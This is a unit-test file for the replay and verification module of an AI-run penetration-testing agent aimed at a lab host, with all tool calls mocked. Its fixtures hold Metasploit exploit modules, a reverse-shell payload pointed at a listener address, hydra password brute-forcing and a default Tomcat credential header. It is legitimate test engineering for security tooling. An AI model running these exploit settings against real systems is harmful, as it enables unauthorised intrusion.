"""Unit tests for categories/verify.py's replay dispatch: confirms every
tool exploit_agent can reach has a working replay case, and -- the
regression guard for the actual bug this was written to catch -- that
REPLAYABLE_TOOLS never silently drifts out of sync with exploit_agent's
real toolset again.

The bug: network_exploit's 7 tools and metasploit were added to
exploit_agent without updating verify's replay allowlist. A live run
against real Metasploitable mislabeled 3 genuine Metasploit-confirmed
exploits (incl. a root shell) as false_positive purely because replay_probe
found nothing it knew how to replay. test_every_exploit_agent_tool_is_replayable
below would have caught that at commit time.

Run with: pytest tests/test_verify.py -v
"""

import os
import sys
from unittest.mock import MagicMock, patch

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
sys.path.insert(0, os.path.join(_REPO_ROOT, "ronin_mini", "ronin-tools-mcp"))

import ronin_mini.exploit_agent.loop as exploit_loop  # noqa: E402
from categories import verify  # noqa: E402
from manifest import load_manifest  # noqa: E402
from scope import Scope  # noqa: E402


def _scope():
    return Scope(scope_dir=_REPO_ROOT, allowed_hosts=["10.0.0.5"])


def _executor():
    ex = MagicMock()
    ex.KALI_LPORT_RANGE = (44440, 44450)
    ex.ensure_kali_container_ready = MagicMock(return_value=None)
    ex.write_file_in_kali_container = MagicMock(return_value=None)
    ex.run_in_kali_container = MagicMock(return_value={"returncode": 0, "stdout": "ok", "stderr": ""})
    return ex


TIMEOUTS = {
    name: 60
    for name in (
        "probe_variant", "execute_python", "nmap", "nikto", "sqlmap",
        "hydra", "gobuster", "enum4linux", "searchsploit", "metasploit",
    )
}


# --- regression guard: this is the actual bug, encoded as a test ----------


def test_every_exploit_agent_tool_has_a_deliberate_replay_decision():
    """Generalizes the original regression guard. The original bug: a tool
    exploit_agent could call had no entry in verify.REPLAYABLE_TOOLS at all --
    a silent omission, not a decision. Now every tool's replay status is
    manifest-declared (replayable: "true"/"false"/"partial", required at
    load_manifest() time), so a tool can legitimately be excluded from
    REPLAYABLE_TOOLS -- but only if manifest.yaml explicitly says "false".
    Silently missing from both is what this test forbids.
    """
    manifest = load_manifest()
    exploit_agent_tools = {name for name, meta in manifest.items() if meta.category in exploit_loop.ALLOWED_CATEGORIES}
    for name in exploit_agent_tools:
        meta = manifest[name]
        if meta.replayable in ("true", "partial"):
            assert name in verify.REPLAYABLE_TOOLS, (
                f"{name} is declared replayable ({meta.replayable!r}) but missing from "
                "verify.REPLAYABLE_TOOLS -- REPLAYABLE_TOOLS is derived from the manifest, "
                "so this should be structurally impossible; if it fires, the derivation broke."
            )
        else:
            assert meta.replayable == "false", f"{name}: replayable must be 'true'/'partial'/'false', got {meta.replayable!r}"
            assert name not in verify.REPLAYABLE_TOOLS


# --- dispatch correctness for each new tool -------------------------------


def test_replay_nmap():
    with patch("categories.verify.run_nmap", return_value={"ok": True}) as mock_run:
        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "nmap", {"target": "10.0.0.5", "scan_type": "quick"})
    assert result == {"ok": True}
    mock_run.assert_called_once()


def test_replay_searchsploit_no_scope_needed():
    with patch("categories.verify.run_searchsploit", return_value={"ok": True}) as mock_run:
        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "searchsploit", {"query": "vsftpd 2.3.4"})
    assert result == {"ok": True}
    mock_run.assert_called_once()


def test_replay_metasploit():
    tool_input = {
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "target": "10.0.0.5",
        "port": 21,
        "payload": None,
        "lhost": None,
        "lport": None,
        "options": None,
        "post_exploit_command": None,
    }
    with patch("categories.verify.run_metasploit", return_value={"ok": True}) as mock_run:
        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "metasploit", tool_input)
    assert result == {"ok": True}
    mock_run.assert_called_once()


def test_replay_hydra():
    tool_input = {"target": "10.0.0.5", "service": "ssh", "username": "admin", "username_wordlist": None, "password_wordlist": "rockyou"}
    with patch("categories.verify.run_hydra", return_value={"ok": True}) as mock_run:
        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "hydra", tool_input)
    assert result == {"ok": True}
    mock_run.assert_called_once()


def test_replay_unknown_tool_returns_error():
    result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "not_a_real_tool", {})
    assert "error" in result


# --- _coerce_dict / _coerce_int: non-Anthropic tool-call type mismatches ---
#
# Surfaced by a real live run against Qwen3.6 Plus (via OpenRouter): unlike
# Claude's native tool use, it didn't always emit correctly-typed nested
# arguments matching the declared JSON schema -- dict-typed fields came back
# as JSON-encoded strings, int-typed fields as numeric strings. The original
# exploit_agent calls apparently succeeded anyway (the MCP server layer
# likely coerces types before the registered tool function runs); replay
# bypasses that layer and crashed with real Python TypeErrors
# ("'<=' not supported between instances of 'int' and 'str'",
# "'str' object has no attribute 'items'"), which verify_agent correctly
# treated as unverifiable rather than misreading as disproof -- but the
# crash itself is a real bug, fixed here.


def test_coerce_dict_parses_json_string():
    assert verify._coerce_dict('{"Authorization": "Basic xyz"}') == {"Authorization": "Basic xyz"}


def test_coerce_dict_passes_through_real_dict_unchanged():
    assert verify._coerce_dict({"a": 1}) == {"a": 1}


def test_coerce_dict_passes_through_none_unchanged():
    assert verify._coerce_dict(None) is None


def test_coerce_dict_non_json_string_passed_through_unchanged():
    # Not silently discarded -- a genuinely malformed value surfaces its own
    # error downstream rather than being swallowed here.
    assert verify._coerce_dict("not json") == "not json"


def test_coerce_int_parses_numeric_string():
    assert verify._coerce_int("44440") == 44440


def test_coerce_int_passes_through_real_int_unchanged():
    assert verify._coerce_int(3632) == 3632


def test_coerce_int_passes_through_none_unchanged():
    assert verify._coerce_int(None) is None


def test_replay_metasploit_with_stringified_port_and_lport_does_not_crash():
    """The exact f3 (distccd) shape from the live Qwen run: lport/port
    recorded as strings. Previously crashed with
    "'<=' not supported between instances of 'int' and 'str'".
    """
    tool_input = {
        "module": "exploit/unix/misc/distcc_exec",
        "target": "10.0.0.5",
        "payload": "cmd/unix/reverse",
        "lhost": "192.168.56.1",
        "lport": "44440",
        "port": "3632",
        "post_exploit_command": "whoami",
    }
    with patch("categories.verify.run_metasploit", return_value={"ok": True}) as mock_run:
        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "metasploit", tool_input)
    assert result == {"ok": True}
    call_kwargs = mock_run.call_args[0]
    # port, lport positionally: (scope, executor, timeout, module, target, port, payload, lhost, lport, options, post_exploit_command)
    assert call_kwargs[5] == 3632
    assert call_kwargs[8] == 44440
    assert isinstance(call_kwargs[5], int) and isinstance(call_kwargs[8], int)


def test_replay_probe_variant_with_stringified_headers_does_not_crash():
    """The exact f6 (Tomcat manager) shape from the live Qwen run: headers
    recorded as JSON-encoded strings. Previously crashed with
    "'str' object has no attribute 'items'".
    """
    tool_input = {
        "method": "GET",
        "url": "http://10.0.0.5:8180/manager/html",
        "baseline_headers": "{}",
        "variant_headers": '{"Authorization": "Basic dG9tY2F0OnRvbWNhdA=="}',
    }
    with patch("categories.verify.run_probe_variant", return_value={"ok": True}) as mock_run:
        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "probe_variant", tool_input)
    assert result == {"ok": True}
    call_args = mock_run.call_args[0]
    # (scope, executor, timeout, method, url, baseline_headers, variant_headers, baseline_params, variant_params, body)
    assert call_args[5] == {}
    assert call_args[6] == {"Authorization": "Basic dG9tY2F0OnRvbWNhdA=="}


# --- end-to-end: recorded_calls filter picks up the previously-dropped tools ---


def test_metasploit_only_attempt_is_now_replayable():
    """The exact shape of the bug: a winning attempt whose transcript is
    entirely searchsploit + metasploit calls (no probe_variant/execute_python
    at all) used to filter down to zero replayable calls.
    """
    transcript = [
        {"tool": "searchsploit", "input": {"query": "vsftpd 2.3.4"}, "output": {}},
        {"tool": "metasploit", "input": {"module": "exploit/unix/ftp/vsftpd_234_backdoor", "target": "10.0.0.5"}, "output": {}},
    ]
    recorded = [t for t in transcript if t["tool"] in verify.REPLAYABLE_TOOLS]
    assert len(recorded) == 2


# --- run_replay_probe: structural "no replay path" fix ---------------------
#
# The old code pre-filtered recorded_calls to only REPLAYABLE_TOOLS members
# *before* building the replays list, so a call to an undeclared tool simply
# vanished -- verify_agent saw an empty/near-empty result and read that as
# disproof. run_replay_probe now walks every recorded call and, for one it
# can't replay, emits an explicit {"replayable": False, "reason": ...} entry
# instead of omitting it -- structurally distinguishable from "replay ran and
# found nothing".


def _findings_list(data: dict) -> list[dict]:
    """run_replay_probe now takes an already-loaded findings list (Phase 3:
    Mongo-backed storage via findings_store.FindingsStore, not a JSON path)
    -- this just unwraps the old {"findings": [...]} test fixture shape.
    """
    return data["findings"]


def _metasploit_finding(finding_id="f2"):
    return {
        "findings": [
            {
                "id": finding_id,
                "type": "known_vulnerable_service",
                "target": "10.0.0.5:21",
                "status": "exploited",
                "exploit_attempts": [
                    {
                        "transcript": [
                            {"tool": "searchsploit", "input": {"query": "vsftpd 2.3.4"}, "output": {"ok": True}},
                            {
                                "tool": "metasploit",
                                "input": {
                                    "module": "exploit/unix/ftp/vsftpd_234_backdoor",
                                    "target": "10.0.0.5",
                                    "port": 21,
                                    "payload": None,
                                    "lhost": None,
                                    "lport": None,
                                    "options": None,
                                    "post_exploit_command": None,
                                },
                                "output": {"session_opened": True, "shell_output": "uid=0(root) gid=0(root)"},
                            },
                        ],
                        "verdict": {
                            "status": "exploited",
                            "evidence": "Real root shell via CVE-2011-2523 vsftpd 2.3.4 backdoor.",
                        },
                    }
                ],
            }
        ]
    }


def test_metasploit_winning_attempt_is_replayed_for_real_not_stubbed(tmp_path):
    """Regression check against the ORIGINAL bug (metasploit-tool findings
    mislabeled false_positive), against the current code. metasploit is
    declared replayable in manifest.yaml today -- this must dispatch to a
    real replay attempt, not the "no replay path" stub. Mirrors the exact
    CVE-2011-2523 shape from the real Metasploitable run that surfaced the
    original bug.
    """
    findings = _findings_list(_metasploit_finding())

    with patch("categories.verify.run_metasploit", return_value={"session_opened": True}) as mock_run, \
         patch("categories.verify.run_searchsploit", return_value={"ok": True}):
        result = verify.run_replay_probe(_scope(), _executor(), TIMEOUTS, findings, "f2")

    assert result["any_call_replayed"] is True
    assert result["unreplayable_call_count"] == 0
    metasploit_entry = next(r for r in result["replays"] if r["tool"] == "metasploit")
    assert metasploit_entry["replayable"] is True
    assert metasploit_entry["replay_output"] == {"session_opened": True}
    mock_run.assert_called_once()


def test_unknown_future_tool_gets_explicit_stub_not_silently_dropped(tmp_path):
    """Proves the NEW mechanism: a winning attempt using a tool with no
    replay support at all (simulating a future tool added to exploit_agent's
    toolset before verify.py is updated for it) must appear in the output as
    an explicit replayable: false stub -- never silently disappear the way
    it used to. This is the case the historical bug's premise (as currently
    described) doesn't actually exercise anymore for "metasploit" specifically,
    since metasploit already has real replay support -- this test proves the
    structural fix using a genuinely undeclared tool instead.
    """
    findings = {
        "findings": [
            {
                "id": "f99",
                "type": "command_injection",
                "target": "10.0.0.5",
                "status": "exploited",
                "exploit_attempts": [
                    {
                        "transcript": [
                            {
                                "tool": "some_future_tool_nobody_added_replay_support_for",
                                "input": {"x": 1},
                                "output": {"claim": "rce achieved"},
                            }
                        ],
                        "verdict": {"status": "exploited", "evidence": "claimed rce"},
                    }
                ],
            }
        ]
    }
    findings = _findings_list(findings)

    result = verify.run_replay_probe(_scope(), _executor(), TIMEOUTS, findings, "f99")

    assert result["any_call_replayed"] is False
    assert result["unreplayable_call_count"] == 1
    entry = result["replays"][0]
    assert entry["replayable"] is False
    assert "reason" in entry
    assert "replay_output" not in entry
    assert entry["tool"] == "some_future_tool_nobody_added_replay_support_for"


def test_mixed_replayable_and_unreplayable_calls_both_appear(tmp_path):
    findings = {
        "findings": [
            {
                "id": "f3",
                "type": "known_vulnerable_service",
                "target": "10.0.0.5",
                "status": "exploited",
                "exploit_attempts": [
                    {
                        "transcript": [
                            {"tool": "nmap", "input": {"target": "10.0.0.5", "scan_type": "quick"}, "output": {}},
                            {"tool": "some_undeclared_tool", "input": {}, "output": {}},
                        ],
                        "verdict": {"status": "exploited", "evidence": "e"},
                    }
                ],
            }
        ]
    }
    findings = _findings_list(findings)

    with patch("categories.verify.run_nmap", return_value={"ok": True}):
        result = verify.run_replay_probe(_scope(), _executor(), TIMEOUTS, findings, "f3")

    assert result["any_call_replayed"] is True
    assert result["replayed_call_count"] == 1
    assert result["unreplayable_call_count"] == 1
    tools_seen = {r["tool"] for r in result["replays"]}
    assert tools_seen == {"nmap", "some_undeclared_tool"}


# --- verify_agent/loop.py: unverifiable is a recognized verdict status -----


def test_unverifiable_is_recognized_as_a_verdict_status():
    blocks = [{"status": "unverifiable", "evidence": "no replay support for the calls in this attempt"}]
    recognized = [b for b in blocks if b.get("status") in ("verified", "false_positive", "unverifiable")]
    assert recognized == blocks
